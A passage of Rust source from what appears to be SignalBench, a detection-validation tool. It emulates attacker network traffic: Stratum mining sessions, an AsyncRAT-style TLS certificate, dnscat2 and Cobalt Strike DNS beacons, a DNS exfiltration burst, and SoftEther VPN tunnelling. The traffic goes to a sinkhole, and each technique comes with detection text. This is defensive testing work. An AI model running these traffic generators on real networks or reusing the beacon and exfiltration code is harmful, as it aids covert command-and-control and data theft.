            detection: "Monitor for: outbound TCP connections to ports 3333 or 4444 with \
                Stratum JSON-RPC payload (mining.subscribe, mining.authorize, mining.submit). \
                Palo Alto App-ID classifies this traffic as stratum-mining after >=5s dwell."
                .to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config
                .parameters
                .get("log_file")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_t1071_stratum.log".to_string());

            if dry_run {
                info!(
                    "[DRY RUN] T1071-IOC-STRATUM: Would attempt full Stratum v1 sessions to {} \
                     mining pool hosts on ports 3333/4444",
                    STRATUM_MINING_DOMAINS.len()
                );
                for domain in STRATUM_MINING_DOMAINS {
                    for port in STRATUM_PORTS {
                        info!(
                            "[DRY RUN] - {}:{} (subscribe -> authorize -> 4x submit -> ping/pong, >=5s dwell)",
                            domain, port
                        );
                    }
                }
                return Ok(SimulationResult {
                    technique_id: "T1071-IOC-STRATUM".to_string(),
                    success: true,
                    message: format!(
                        "DRY RUN: Would run Stratum v1 sessions to {} hosts x {} ports",
                        STRATUM_MINING_DOMAINS.len(),
                        STRATUM_PORTS.len()
                    ),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            let running_as_root = is_running_as_root();
            let sinkhole_ip = resolve_sinkhole_ip().await;
            let mut hosts_modified = false;

            if running_as_root {
                match add_hosts_entries(&sinkhole_ip) {
                    Ok(added) => {
                        hosts_modified = added;
                        if added {
                            println!("[OK] Added safe test entries to /etc/hosts");
                        }
                    }
                    Err(e) => {
                        warn!(
                            "[T1071-IOC-STRATUM] Failed to add hosts entries: {}",
                            e
                        );
                    }
                }
            }

            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {}", e))?;
            writeln!(
                log,
                "# SignalBench T1071-IOC-STRATUM - Stratum Mining Protocol Simulation"
            )
            .unwrap();
            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log, "# Sinkhole: {}", sinkhole_ip).unwrap();
            writeln!(log, "# --------------------------------------------------------\n").unwrap();

            println!("\n[T1071-IOC-STRATUM] Stratum Protocol Simulation");
            println!("{}", "-".repeat(60));
            println!("{:<50} OUTCOME", "TARGET");
            println!("{}", "-".repeat(60));

            writeln!(log, "=== Stratum Protocol Simulation ===").unwrap();
            writeln!(log, "Ports: 3333, 4444").unwrap();
            writeln!(log, "Protocol: Stratum JSON-RPC (cleartext TCP)").unwrap();
            writeln!(log).unwrap();

            let mut stratum_attempts: u32 = 0;
            let mut stratum_connected: u32 = 0;

            for &domain in STRATUM_MINING_DOMAINS {
                let resolved_to_safe =
                    domain_resolves_to_safe_ip(domain, &sinkhole_ip).await;
                if !resolved_to_safe && running_as_root {
                    warn!(
                        "[T1071-IOC-STRATUM] {} did not resolve to {} via /etc/hosts - \
                         using sinkhole IP directly",
                        domain, sinkhole_ip
                    );
                }
                let connect_host = if resolved_to_safe {
                    domain.to_string()
                } else {
                    sinkhole_ip.clone()
                };
                let via_note = if resolved_to_safe {
                    format!("via /etc/hosts -> {}", sinkhole_ip)
                } else {
                    format!("direct {}", sinkhole_ip)
                };

                for &port in STRATUM_PORTS {
                    stratum_attempts += 1;
                    let addr = format!("{}:{}", connect_host, port);
                    let display = format!("{}:{}", domain, port);

                    print!("  {:<48} ", display);
                    writeln!(log, "--- {} ({}) ---", display, via_note).unwrap();
                    writeln!(log, "Time: {}", chrono::Local::now()).unwrap();

                    match async_timeout(
                        Duration::from_secs(3),
                        TcpStream::connect(&addr),
                    )
                    .await
                    {
                        Ok(Ok(stream)) => {
                            stratum_connected += 1;
                            println!("CONNECTED [{}]", via_note);
                            writeln!(log, "TCP: CONNECTED").unwrap();

                            let session_start = std::time::Instant::now();
                            let (read_half, mut write_half) = stream.into_split();
                            let mut reader = BufReader::new(read_half);

                            match async_timeout(
                                Duration::from_secs(2),
                                write_half.write_all(STRATUM_SUBSCRIBE.as_bytes()),
                            )
                            .await
                            {
                                Ok(Ok(())) => {
                                    writeln!(log, "Sent: mining.subscribe").unwrap();
                                }
                                Ok(Err(e)) => {
                                    writeln!(
                                        log,
                                        "Sent: mining.subscribe (write error: {})",
                                        e
                                    )
                                    .unwrap();
                                }
                                Err(_) => {
                                    writeln!(
                                        log,
                                        "Sent: mining.subscribe (write timeout)"
                                    )
                                    .unwrap();
                                }
                            }
                            let sub_lines =
                                read_stratum_lines(&mut reader, 2, 5).await;
                            let mut job_id = "sb00".to_string();
                            for line in &sub_lines {
                                writeln!(log, "Recv: {}", line).unwrap();
                            }
                            if let Some(id) = extract_notify_job_id(&sub_lines) {
                                job_id = id;
                            }

                            match async_timeout(
                                Duration::from_secs(2),
                                write_half
                                    .write_all(STRATUM_AUTHORIZE.as_bytes()),
                            )
                            .await
                            {
                                Ok(Ok(())) => {
                                    writeln!(log, "Sent: mining.authorize").unwrap();
                                }
                                Ok(Err(e)) => {
                                    writeln!(
                                        log,
                                        "Sent: mining.authorize (write error: {})",
                                        e
                                    )
                                    .unwrap();
                                }
                                Err(_) => {
                                    writeln!(
                                        log,
                                        "Sent: mining.authorize (write timeout)"
                                    )
                                    .unwrap();
                                }
                            }
                            let auth_lines =
                                read_stratum_lines(&mut reader, 2, 6).await;
                            let mut saw_version_req = false;
                            for line in &auth_lines {
                                writeln!(log, "Recv: {}", line).unwrap();
                                if line.contains("\"client.get_version\"") {
                                    saw_version_req = true;
                                }
                            }
                            if let Some(id) = extract_notify_job_id(&auth_lines) {
                                job_id = id;
                            }

                            if saw_version_req {
                                match async_timeout(
                                    Duration::from_secs(2),
                                    write_half.write_all(
                                        STRATUM_CLIENT_VERSION_RESPONSE.as_bytes(),
                                    ),
                                )
                                .await
                                {
                                    Ok(Ok(())) => {
                                        writeln!(
                                            log,
                                            "Sent: client.get_version response"
                                        )
                                        .unwrap();
                                    }
                                    Ok(Err(e)) => {
                                        writeln!(
                                            log,
                                            "Sent: client.get_version (write error: {})",
                                            e
                                        )
                                        .unwrap();
                                    }
                                    Err(_) => {
                                        writeln!(
                                            log,
                                            "Sent: client.get_version (write timeout)"
                                        )
                                        .unwrap();
                                    }
                                }
                            }

                            for round in 0u32..4 {
                                let submit_id = round + 3;
                                let nonce: u32 = rand::random();
                                let submit_msg =
                                    make_stratum_submit(submit_id, &job_id, nonce);
                                match async_timeout(
                                    Duration::from_secs(2),
                                    write_half.write_all(submit_msg.as_bytes()),
                                )
                                .await
                                {
                                    Ok(Ok(())) => {
                                        writeln!(
                                            log,
                                            "Sent: mining.submit round {} (job={}, nonce={:08x})",
                                            round + 1,
                                            job_id,
                                            nonce
                                        )
                                        .unwrap();
                                    }
                                    Ok(Err(e)) => {
                                        writeln!(
                                            log,
                                            "Sent: mining.submit round {} (write error: {})",
                                            round + 1,
                                            e
                                        )
                                        .unwrap();
                                    }
                                    Err(_) => {
                                        writeln!(
                                            log,
                                            "Sent: mining.submit round {} (write timeout)",
                                            round + 1
                                        )
                                        .unwrap();
                                    }
                                }
                                let submit_lines =
                                    read_stratum_lines(&mut reader, 2, 3).await;
                                for line in &submit_lines {
                                    writeln!(log, "Recv: {}", line).unwrap();
                                }
                                if let Some(id) =
                                    extract_notify_job_id(&submit_lines)
                                {
                                    job_id = id;
                                } else {
                                    job_id = format!("sb{:02}", round + 2);
                                }
                                if round < 3 {
                                    sleep(Duration::from_millis(1000)).await;
                                }
                            }

                            match async_timeout(
                                Duration::from_secs(2),
                                write_half.write_all(STRATUM_PING.as_bytes()),
                            )
                            .await
                            {
                                Ok(Ok(())) => {
                                    writeln!(log, "Sent: mining.ping").unwrap();
                                }
                                Ok(Err(e)) => {
                                    writeln!(
                                        log,
                                        "Sent: mining.ping (write error: {})",
                                        e
                                    )
                                    .unwrap();
                                }
                                Err(_) => {
                                    writeln!(
                                        log,
                                        "Sent: mining.ping (write timeout)"
                                    )
                                    .unwrap();
                                }
                            }
                            let pong_lines =
                                read_stratum_lines(&mut reader, 2, 2).await;
                            for line in &pong_lines {
                                writeln!(log, "Recv: {}", line).unwrap();
                            }

                            let elapsed = session_start.elapsed();
                            if elapsed < std::time::Duration::from_secs(5) {
                                let top_up =
                                    std::time::Duration::from_secs(5) - elapsed;
                                sleep(Duration::from_millis(
                                    top_up.as_millis() as u64,
                                ))
                                .await;
                            }
                            writeln!(
                                log,
                                "Session complete: {:.1}s dwell, job_id={}",
                                session_start.elapsed().as_secs_f32(),
                                job_id
                            )
                            .unwrap();
                        }
                        Ok(Err(e)) => {
                            println!("REFUSED [{}]", via_note);
                            writeln!(log, "TCP: REFUSED ({})", e).unwrap();
                        }
                        Err(_) => {
                            println!("TIMEOUT [{}]", via_note);
                            writeln!(log, "TCP: TIMEOUT").unwrap();
                        }
                    }
                    writeln!(log).unwrap();
                }
            }

            println!("{}", "-".repeat(60));
            println!(
                "[T1071-IOC-STRATUM] Stratum phase: {} attempts, {} connected",
                stratum_attempts, stratum_connected
            );
            info!(
                "[T1071-IOC-STRATUM] Complete: {} attempts, {} connected",
                stratum_attempts, stratum_connected
            );
            writeln!(log, "=== Summary ===").unwrap();
            writeln!(log, "Attempts: {}", stratum_attempts).unwrap();
            writeln!(log, "Connected: {}", stratum_connected).unwrap();
            writeln!(
                log,
                "Refused/Timeout: {}",
                stratum_attempts - stratum_connected
            )
            .unwrap();

            let mut artifacts = vec![log_file.clone()];
            if hosts_modified {
                artifacts.push(HOSTS_ARTIFACT_MARKER.to_string());
            }

            Ok(SimulationResult {
                technique_id: "T1071-IOC-STRATUM".to_string(),
                success: true,
                message: format!(
                    "Stratum v1 mining simulation: {} TCP attempts ({} connected) across \
                     {} hosts x {} ports",
                    stratum_attempts,
                    stratum_connected,
                    STRATUM_MINING_DOMAINS.len(),
                    STRATUM_PORTS.len()
                ),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1071-IOC-STRATUM] Starting cleanup");
            if artifacts.contains(&HOSTS_ARTIFACT_MARKER.to_string()) {
                if is_running_as_root() {
                    match remove_hosts_entries() {
                        Ok(()) => {
                            info!("[T1071-IOC-STRATUM] Cleaned up /etc/hosts entries");
                        }
                        Err(e) => {
                            warn!(
                                "[T1071-IOC-STRATUM] Failed to clean up /etc/hosts: {}",
                                e
                            );
                        }
                    }
                } else {
                    warn!(
                        "[T1071-IOC-STRATUM] Cannot clean up /etc/hosts without root"
                    );
                }
            }
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = fs::remove_file(artifact) {
                        warn!(
                            "[T1071-IOC-STRATUM] Failed to remove {}: {}",
                            artifact, e
                        );
                    } else {
                        debug!("[T1071-IOC-STRATUM] Removed: {}", artifact);
                    }
                }
            }
            info!("[T1071-IOC-STRATUM] Cleanup complete");
            Ok(())
        })
    }
}

pub struct SuspiciousDomainsAsyncRat {}

#[async_trait]
impl AttackTechnique for SuspiciousDomainsAsyncRat {
    fn info(&self) -> Technique {
        Technique {
            id: "T1071-IOC-ASYNCRAT".to_string(),
            name: "Suspicious Domain Connections - AsyncRAT TLS Certificate Simulation"
                .to_string(),
            description: "Initiates a TLS 1.2 handshake to sinkhole:8888 via openssl s_client. \
                The sinkhole presents a self-signed certificate with CN=AsyncRAT Server. \
                TLS 1.2 is required: in TLS 1.3 the Certificate message is encrypted, making \
                the CN= IOC invisible to PA-440 inline inspection without full SSL decryption. \
                -tls1_2 forces the older record format so the Certificate appears in plaintext \
                on the wire. SNI is set to asyncrat.signalbench.local."
                .to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save connection log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_t1071_asyncrat.log".to_string()),
                },
                TechniqueParameter {
                    name: "timeout".to_string(),
                    description: "Connection timeout in seconds".to_string(),
                    required: false,
                    default: Some("3".to_string()),
                },
            ],
            detection: "Monitor for: outbound TLS connections to non-standard port 8888, \
                TLS 1.2 handshake with CN=AsyncRAT Server in the certificate (visible to \
                inline inspection without SSL decryption)."
                .to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config
                .parameters
                .get("log_file")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_t1071_asyncrat.log".to_string());
            let timeout = config
                .parameters
                .get("timeout")
                .and_then(|t| t.parse::<u32>().ok())
                .unwrap_or(3);

            if dry_run {
                let sinkhole_ip = resolve_sinkhole_ip().await;
                info!(
                    "[DRY RUN] T1071-IOC-ASYNCRAT: Would attempt AsyncRAT TLS 1.2 handshake \
                     to {}:8888 (CN=AsyncRAT Server, SNI=asyncrat.signalbench.local)",
                    sinkhole_ip
                );
                return Ok(SimulationResult {
                    technique_id: "T1071-IOC-ASYNCRAT".to_string(),
                    success: true,
                    message: format!(
                        "DRY RUN: Would send TLS 1.2 handshake to {}:8888 (CN=AsyncRAT Server)",
                        sinkhole_ip
                    ),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            let sinkhole_ip = resolve_sinkhole_ip().await;

            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {}", e))?;
            writeln!(
                log,
                "# SignalBench T1071-IOC-ASYNCRAT - AsyncRAT TLS Certificate Simulation"
            )
            .unwrap();
            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log, "# Sinkhole: {}", sinkhole_ip).unwrap();
            writeln!(log, "# --------------------------------------------------------\n").unwrap();

            println!("\n[T1071-IOC-ASYNCRAT] AsyncRAT TLS Certificate Simulation");
            println!("{}", "-".repeat(60));
            writeln!(log, "=== AsyncRAT TLS ===").unwrap();
            let asyncrat_addr = format!("{}:8888", sinkhole_ip);
            writeln!(log, "Target: {}", asyncrat_addr).unwrap();
            writeln!(log, "SNI: asyncrat.signalbench.local").unwrap();
            print!("  {:<48} ", asyncrat_addr);

            match async_timeout(
                Duration::from_secs(u64::from(timeout) + 2),
                Command::new("openssl")
                    .args([
                        "s_client",
                        "-connect",
                        &asyncrat_addr,
                        "-tls1_2",
                        "-brief",
                        "-servername",
                        "asyncrat.signalbench.local",
                    ])
                    .stdin(Stdio::null())
                    .output(),
            )
            .await
            {
                Ok(Ok(output)) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let ec = output.status.code().unwrap_or(-1);
                    let cert_line = stdout
                        .lines()
                        .find(|l| {
                            l.contains("subject")
                                || l.contains("CN=")
                                || l.contains("issuer")
                        })
                        .unwrap_or("(no cert info)");
                    if ec == 0 || stdout.contains("CONNECTION ESTABLISHED") {
                        println!("CONNECTED");
                        writeln!(
                            log,
                            "AsyncRAT TLS: CONNECTED ({})",
                            cert_line.trim()
                        )
                        .unwrap();
                        info!(
                            "[T1071-IOC-ASYNCRAT] TLS connected to {}: {}",
                            asyncrat_addr,
                            cert_line.trim()
                        );
                    } else {
                        println!("ATTEMPTED (ec={})", ec);
                        writeln!(
                            log,
                            "AsyncRAT TLS: ATTEMPTED (ec={}, {})",
                            ec,
                            cert_line.trim()
                        )
                        .unwrap();
                        info!(
                            "[T1071-IOC-ASYNCRAT] TLS attempted {}: ec={}",
                            asyncrat_addr, ec
                        );
                    }
                }
                Ok(Err(e)) => {
                    println!("ERROR ({})", e);
                    writeln!(log, "AsyncRAT TLS: ERROR ({})", e).unwrap();
                    debug!(
                        "[T1071-IOC-ASYNCRAT] TLS error at {}: {} (openssl not installed?)",
                        asyncrat_addr, e
                    );
                }
                Err(_) => {
                    println!("TIMEOUT");
                    writeln!(log, "AsyncRAT TLS: TIMEOUT").unwrap();
                    debug!(
                        "[T1071-IOC-ASYNCRAT] TLS timeout at {}",
                        asyncrat_addr
                    );
                }
            }
            println!("{}", "-".repeat(60));
            info!(
                "[T1071-IOC-ASYNCRAT] Complete: TLS 1.2 handshake to {}",
                asyncrat_addr
            );

            Ok(SimulationResult {
                technique_id: "T1071-IOC-ASYNCRAT".to_string(),
                success: true,
                message: format!(
                    "AsyncRAT TLS 1.2 handshake to {} (CN=AsyncRAT Server, \
                     SNI=asyncrat.signalbench.local)",
                    asyncrat_addr
                ),
                artifacts: vec![log_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = fs::remove_file(artifact) {
                        warn!(
                            "[T1071-IOC-ASYNCRAT] Failed to remove {}: {}",
                            artifact, e
                        );
                    } else {
                        debug!("[T1071-IOC-ASYNCRAT] Removed: {}", artifact);
                    }
                }
            }
            info!("[T1071-IOC-ASYNCRAT] Cleanup complete");
            Ok(())
        })
    }
}

pub struct SuspiciousDomainsDns {}

#[async_trait]
impl AttackTechnique for SuspiciousDomainsDns {
    fn info(&self) -> Technique {
        Technique {
            id: "T1071-IOC-DNS".to_string(),
            name: "Suspicious Domain Connections - Malware DNS Probe Simulation".to_string(),
            description: "Sends raw UDP/53 DNS probes to the sinkhole: dnscat2 78-byte tunnel \
                init packet (matching snort3-malware-cnc.rules MALWARE-CNC dnscat2 DNS tunneling \
                initialization), Cobalt Strike QTYPE A beacon 27 bytes (sid:45906), Cobalt \
                Strike QTYPE TXT beacon 27 bytes (sid:45907), and a T1048 high-volume exfil \
                burst: 120 queries at 10 QPS, alternating A/TXT, each carrying 3 x 60-char \
                URL-safe-base64 labels (45 raw bytes each, 135 raw bytes per query, 16,200 bytes \
                encoded total) under t1048.signalbench.sigre.xyz. Total burst duration ~12 s, \
                clearing the >15 KB single-domain exfil threshold."
                .to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![TechniqueParameter {
                name: "log_file".to_string(),
                description: "Path to save probe log".to_string(),
                required: false,
                default: Some("/tmp/signalbench_t1071_dns.log".to_string()),
            }],
            detection: "Monitor for: raw UDP/53 packets matching dnscat2 tunnel init signature \
                (78 bytes, 0x3C label prefix, 'dcat2!command'), Cobalt Strike DNS A/TXT beacons \
                (sids 45906/45907, QNAME aaa.stage), and high-volume DNS queries (>120 \
                queries/12s) using URL-safe-base64 encoded labels under a single subdomain \
                (T1048 exfil threshold >15 KB)."
                .to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config
                .parameters
                .get("log_file")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_t1071_dns.log".to_string());

            if dry_run {
                let sinkhole_ip = resolve_sinkhole_ip().await;
                info!(
                    "[DRY RUN] T1071-IOC-DNS: Would send dnscat2 DNS probe + CS A/TXT beacons + \
                     T1048 ~16.2 KB exfil burst to {}:53",
                    sinkhole_ip
                );
                return Ok(SimulationResult {
                    technique_id: "T1071-IOC-DNS".to_string(),
                    success: true,
                    message: format!(
                        "DRY RUN: Would send DNS probes (dnscat2 + CS A/TXT + T1048 exfil burst) \
                         to {}:53",
                        sinkhole_ip
                    ),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            let sinkhole_ip = resolve_sinkhole_ip().await;

            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {}", e))?;
            writeln!(
                log,
                "# SignalBench T1071-IOC-DNS - Malware DNS Probe Simulation"
            )
            .unwrap();
            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log, "# Sinkhole: {}", sinkhole_ip).unwrap();
            writeln!(log, "# --------------------------------------------------------\n").unwrap();

            println!("\n[T1071-IOC-DNS] Malware DNS Probe Simulation");
            println!("{}", "-".repeat(60));
            writeln!(log, "=== DNS Probes ===").unwrap();
            writeln!(log, "Target: {}:53 (UDP)", sinkhole_ip).unwrap();

            let mut dns_sent: u32 = 0;
            match UdpSocket::bind("0.0.0.0:0").await {
                Ok(sock) => {
                    let dns_target = format!("{}:53", sinkhole_ip);

                    let dnscat2_pkt = build_dnscat2_dns_packet();
                    match sock.send_to(&dnscat2_pkt, &dns_target).await {
                        Ok(n) => {
                            dns_sent += 1;
                            writeln!(
                                log,
                                "dnscat2 DNS: {} bytes sent to {}",
                                n, dns_target
                            )
                            .unwrap();
                            info!(
                                "[T1071-IOC-DNS] dnscat2 DNS probe: {} bytes to {}",
                                n, dns_target
                            );
                            println!(
                                "  [-->] dnscat2 DNS probe sent ({} bytes to {})",
                                n, dns_target
                            );
                        }
                        Err(e) => {
                            writeln!(log, "dnscat2 DNS: ERROR ({})", e).unwrap();
                            debug!("[T1071-IOC-DNS] dnscat2 DNS send error: {}", e);
                        }
                    }

                    let cs_a_pkt = build_cobalt_strike_dns_packet(1);
                    match sock.send_to(&cs_a_pkt, &dns_target).await {
                        Ok(n) => {
                            dns_sent += 1;
                            writeln!(
                                log,
                                "CS DNS A: {} bytes sent to {}",
                                n, dns_target
                            )
                            .unwrap();
                            info!(
                                "[T1071-IOC-DNS] CS DNS A beacon: {} bytes to {}",
                                n, dns_target
                            );
                            println!(
                                "  [-->] Cobalt Strike DNS A beacon sent ({} bytes to {})",
                                n, dns_target
                            );
                        }
                        Err(e) => {
                            writeln!(log, "CS DNS A: ERROR ({})", e).unwrap();
                            debug!("[T1071-IOC-DNS] CS DNS A send error: {}", e);
                        }
                    }

                    let cs_txt_pkt = build_cobalt_strike_dns_packet(16);
                    match sock.send_to(&cs_txt_pkt, &dns_target).await {
                        Ok(n) => {
                            dns_sent += 1;
                            writeln!(
                                log,
                                "CS DNS TXT: {} bytes sent to {}",
                                n, dns_target
                            )
                            .unwrap();
                            info!(
                                "[T1071-IOC-DNS] CS DNS TXT beacon: {} bytes to {}",
                                n, dns_target
                            );
                            println!(
                                "  [-->] Cobalt Strike DNS TXT beacon sent ({} bytes to {})",
                                n, dns_target
                            );
                        }
                        Err(e) => {
                            writeln!(log, "CS DNS TXT: ERROR ({})", e).unwrap();
                            debug!("[T1071-IOC-DNS] CS DNS TXT send error: {}", e);
                        }
                    }

                    let mut hv_sent: u32 = 0;
                    let mut hv_errors: u32 = 0;
                    let mut hv_encoded_total: usize = 0;
                    let hv_delay = Duration::from_millis(1000 / T1048_HV_QPS);
                    for i in 0..T1048_HV_TOTAL_QUERIES {
                        let qtype: u16 = if i % 2 == 0 { 1 } else { 16 };
                        let txid: u16 =
                            0x1000u16.wrapping_add((i & 0x0FFF) as u16);
                        let (hv_pkt, encoded) =
                            build_t1048_high_volume_exfil_packet(qtype, txid);
                        match sock.send_to(&hv_pkt, &dns_target).await {
                            Ok(_) => {
                                hv_sent += 1;
                                hv_encoded_total += encoded;
                            }
                            Err(e) => {
                                hv_errors += 1;
                                if hv_errors <= 3 {
                                    debug!(
                                        "[T1071-IOC-DNS] T1048 HV exfil send error: {}",
                                        e
                                    );
                                }
                            }
                        }
                        sleep(hv_delay).await;
                    }
                    dns_sent += hv_sent;
                    writeln!(
                        log,
                        "T1048 HV exfil burst: {} queries sent ({} errors), {} bytes \
                         encoded under t1048.signalbench.sigre.xyz",
                        hv_sent, hv_errors, hv_encoded_total
                    )
                    .unwrap();
                    info!(
                        "[T1071-IOC-DNS] T1048 HV exfil burst: {} queries, {} bytes encoded",
                        hv_sent, hv_encoded_total
                    );
                    println!(
                        "  [-->] T1048 high-volume exfil burst: {} queries, {} bytes encoded \
                         under t1048.signalbench.sigre.xyz",
                        hv_sent, hv_encoded_total
                    );
                }
                Err(e) => {
                    writeln!(log, "UDP socket bind: ERROR ({})", e).unwrap();
                    warn!("[T1071-IOC-DNS] Failed to bind UDP socket: {}", e);
                }
            }

            println!("{}", "-".repeat(60));
            println!(
                "[T1071-IOC-DNS] DNS probe phase: {} packets sent to {}:53",
                dns_sent, sinkhole_ip
            );
            writeln!(log, "DNS probes sent: {}", dns_sent).unwrap();
            info!(
                "[T1071-IOC-DNS] Complete: {} DNS packets sent to {}:53",
                dns_sent, sinkhole_ip
            );

            Ok(SimulationResult {
                technique_id: "T1071-IOC-DNS".to_string(),
                success: true,
                message: format!(
                    "DNS probe simulation: {} packets sent to {}:53 \
                     (dnscat2 + CS A/TXT + T1048 exfil burst)",
                    dns_sent, sinkhole_ip
                ),
                artifacts: vec![log_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = fs::remove_file(artifact) {
                        warn!(
                            "[T1071-IOC-DNS] Failed to remove {}: {}",
                            artifact, e
                        );
                    } else {
                        debug!("[T1071-IOC-DNS] Removed: {}", artifact);
                    }
                }
            }
            info!("[T1071-IOC-DNS] Cleanup complete");
            Ok(())
        })
    }
}

// ---------------------------------------------------------------------------
// T1572-SOFTETHER — SoftEther / PacketiX VPN Protocol Tunneling
// ---------------------------------------------------------------------------
//
// SoftEther VPN (originally PacketiX VPN) uses an HTTP-mode transport:
// binary PACK-serialised messages are exchanged as HTTPS POST bodies to
// /vpnsvc/connect.cgi on port 992.  PA-440 App-ID classifies the
// bidirectional TLS + HTTP-PACK flow as "softether-vpn" / "PacketiX VPN"
// (both labels appear in Palo Alto's App-ID database for the same protocol).
//
// Reference: Unit42 CL-STA-1062 / TinyRCT backdoor (2024).
//            SoftEther source: github.com/SoftEtherVPN/SoftEtherVPN
//            PACK wire format: src/Mayaqua/Pack.c
//
// Volume: 3 independent VPN sessions × 3 rounds each = 9 HTTPS POST
// requests total, matching the SharePoint exfil baseline (~10 requests).

// SoftEther PACK type codes (src/Mayaqua/Pack.c)
const SE_INT:  u8 = 0;
const SE_DATA: u8 = 1;
const SE_STR:  u8 = 2;

fn se_elem_int(name: &str, value: u32) -> Vec<u8> {
    let n = name.as_bytes();
    let mut v = vec![SE_INT];
    v.extend_from_slice(&(n.len() as u32).to_be_bytes());
    v.extend_from_slice(n);
    v.extend_from_slice(&1u32.to_be_bytes()); // value_count = 1
    v.extend_from_slice(&value.to_be_bytes());
    v
}

fn se_elem_str(name: &str, value: &str) -> Vec<u8> {
    let n = name.as_bytes();
    let s = value.as_bytes();
    let mut v = vec![SE_STR];
    v.extend_from_slice(&(n.len() as u32).to_be_bytes());
    v.extend_from_slice(n);
    v.extend_from_slice(&1u32.to_be_bytes());
    v.extend_from_slice(&(s.len() as u32).to_be_bytes());
    v.extend_from_slice(s);
    v
}

fn se_elem_data(name: &str, value: &[u8]) -> Vec<u8> {
    let n = name.as_bytes();
    let mut v = vec![SE_DATA];
    v.extend_from_slice(&(n.len() as u32).to_be_bytes());
    v.extend_from_slice(n);
    v.extend_from_slice(&1u32.to_be_bytes());
    v.extend_from_slice(&(value.len() as u32).to_be_bytes());
    v.extend_from_slice(value);
    v
}

fn se_pack(elements: &[Vec<u8>]) -> Vec<u8> {
    let mut out = (elements.len() as u32).to_be_bytes().to_vec();
    for e in elements {
        out.extend_from_slice(e);
    }
    out
}

// SoftEther HTTP headers — User-Agent verbatim from src/Cedar/Http.c
const SE_UA: &str = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; \
                     .NET CLR 1.1.4322; .NET CLR 2.0.50727)";
const SE_HOST: &str = "signalbench-vpn.cn";
const SE_PORT: u16 = 992;
const SE_PATH: &str = "/vpnsvc/connect.cgi";
const SE_SESSIONS: u32 = 3; // sessions per run (3 × 3 = 9 requests ≈ SharePoint 10)

/// Run one SoftEther VPN session: hello → login → getconfig (3 HTTPS POSTs).
/// Returns the number of successful exchanges.
async fn softether_vpn_session(
    client: &reqwest::Client,
    session_num: u32,
    log: &mut File,
    timeout_secs: u32,
) -> u32 {
    let client_id: u32 = rand::random();
    let client_random: Vec<u8> = (0..20).map(|_| rand::random::<u8>()).collect();

    let rounds: &[(&str, Vec<u8>)] = &[
        (
            "hello",
            se_pack(&[
                se_elem_str("method", "hello"),
                se_elem_int("client_ver", 0x0002_0064),
                se_elem_int("client_build", 9737),
                se_elem_str("client_str", "SoftEther VPN Client"),
                se_elem_int("client_id", client_id),
                se_elem_data("random", &client_random),
            ]),
        ),
        (
            "login",
            se_pack(&[
                se_elem_str("method", "login"),
                se_elem_str("hub", "VPN"),
                se_elem_str("username", "vpn"),
                se_elem_str("client_auth_method", "anonymous"),
            ]),
        ),
        (
            "getconfig",
            se_pack(&[se_elem_str("method", "getconfig")]),
        ),
    ];

    let url = format!("https://{}:{}{}", SE_HOST, SE_PORT, SE_PATH);
    let mut ok = 0u32;

    for (round_name, body) in rounds {
        writeln!(
            log,
            "\n[session {session_num}] POST {SE_PATH} method={round_name} body={} bytes",
            body.len()
        )
        .unwrap();

        match tokio::time::timeout(
            Duration::from_secs(u64::from(timeout_secs) + 2),
            client
                .post(&url)
                .header("Content-Type", "application/octet-stream")
                .header("Accept", "application/octet-stream")
                .header("Accept-Encoding", "identity")
                .header("Cache-Control", "no-cache")
                .header("Pragma", "no-cache")
                .header("Keep-Alive", "timeout=15, max=19")
                .header("Connection", "Keep-Alive")
                .header("User-Agent", SE_UA)
                .header("Host", SE_HOST)
                .body(body.clone())
                .send(),
        )
        .await
        {
            Ok(Ok(resp)) => {
                let status = resp.status();
                writeln!(log, "  -> HTTP {status}").unwrap();
                info!(
                    "[T1572-SOFTETHER] session {session_num} {round_name} -> HTTP {status}"
                );
                ok += 1;
            }
            Ok(Err(e)) => {
